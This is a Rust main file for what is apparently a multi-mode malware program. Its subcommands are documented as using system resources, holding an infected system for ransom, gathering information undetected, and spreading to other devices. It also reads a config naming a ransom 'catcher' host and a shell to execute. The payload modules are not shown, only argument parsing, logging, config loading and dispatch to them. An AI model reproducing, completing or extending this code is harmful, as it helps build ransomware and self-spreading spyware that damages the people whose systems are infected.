use clap::{Parser, Subcommand};
use config::{Config, ConfigError, FileFormat};
use env_logger::{fmt::Target, Builder};
use log::{debug, error, info, log_enabled, warn, Level, LevelFilter};
use std::{io::Write, path::PathBuf};

mod borrow;
mod ransom;
mod snoop;
mod spread;

use borrow::*;
use ransom::*;
use snoop::*;
use spread::*;

#[derive(Parser)]
#[command(author, version, about, long_about = None)]
struct Cli {
    /// Sets a custom config file
    #[arg(short, long, value_name = "FILE")]
    config: Option<String>,

    /// Set the logging info destination
    #[arg(short, long, value_name = "FILE")]
    output: Option<String>,

    /// Set the current working directory
    #[arg(short, long, value_name = "DIR")]
    pwd: Option<String>,

    /// Turn debugging information on
    #[arg(short, long, action = clap::ArgAction::Count)]
    debug: u8,

    #[command(subcommand)]
    mode: Option<Modes>,
}

#[derive(Subcommand)]
enum Modes {
    /// Utilize system resources
    Borrow,
    /// Hold the infected system for ransom
    Ransom,
    /// Gather information without being detected
    Snoop,
    /// Spread the running program to other devices    
    Spread,
    /// Dump the current configuration file
    DumpConfig,
}

fn main() {
    // get user input
    let cli = Cli::parse();

    // set up logging
    let mut builder = Builder::from_default_env();
    builder.format(|buf, record| writeln!(buf, "{} - {}", record.level(), record.args()));
    // log to specified output file, if any
    if let Some(save_to) = cli.output {
        if let Ok(file) = std::fs::File::create(save_to) {
            builder.target(Target::Pipe(Box::new(file)));
        } else {
            builder.target(Target::Stdout);
        }
    }

    // set the logging verbosity
    let verbosity = match cli.debug {
        0 => Level::Error,
        1 => Level::Warn,
        2 => Level::Info,
        3 => Level::Debug,
        4 => Level::Trace,
        _ => {
            println!("ignoring additional debug flags");
            Level::Trace
        }
    };
    builder.filter(None, verbosity.to_level_filter()).init();

    // Get the user specified config path, if any
    let conf: Option<Config> = match cli.config.as_deref() {
        Some(conf_path) => read_config(conf_path).ok(),
        None => None,
    };

    // Check if the user provided a working directory
    if let Some(pwd) = cli.pwd {
        match std::env::set_current_dir(pwd) {
            Ok(msg) => info!("{msg:?}"),
            Err(e) => error!("{e:?}"),
        }
    }

    // run the user specified mode
    if let Some(mode) = cli.mode {
        match mode {
            Modes::Borrow => borrow(get_exe(&conf), get_exearg(&conf)),
            Modes::Ransom => ransom(&get_root(&conf), &get_catcher(&conf)),
            Modes::Snoop => snoop(),
            Modes::Spread => spread(),
            Modes::DumpConfig => dumpconf(conf),
            // _ => unreachable!(), // panics if code becomes not unreachable
        }
    } else {
        warn!("no mode specified");
    }
    info!("finished!");
}

fn read_config(path: &str) -> Result<Config, ConfigError> {
    let builder = Config::builder()
        .set_default("default", "1")?
        .add_source(config::File::new(path, FileFormat::Json))
        .set_override("override", "1")?;

    builder.build()
}

fn dumpconf(conf: Option<Config>) {
    if let Some(conf) = conf {
        info!("{conf:?}")
    } else {
        error!("could not dump configuration file {conf:?}")
    }
}

fn get_field<'de, T>(field: &str, config: &Option<Config>) -> Option<T>
where
    T: serde::de::Deserialize<'de>,
{
    if let Some(conf) = config {
        conf.get::<T>(field).ok()
    } else {
        error!("could not find {field} in config");
        None
    }
}

fn get_root(conf: &Option<Config>) -> String {
    if let Some(root) = get_field("root", conf) {
        root
    } else {
        String::from("./")
    }
}

fn get_catcher(conf: &Option<Config>) -> String {
    if let Some(catcher) = get_field("catcher", conf) {
        catcher
    } else {
        String::from("localhost")
    }
}

fn get_exe(conf: &Option<Config>) -> PathBuf {
    if let Some(exepath) = get_field("exepath", conf) {
        exepath
    } else {
        PathBuf::from("/bin/sh")
    }
}

fn get_exearg(conf: &Option<Config>) -> Option<String> {
    get_field("exearg", conf)
}
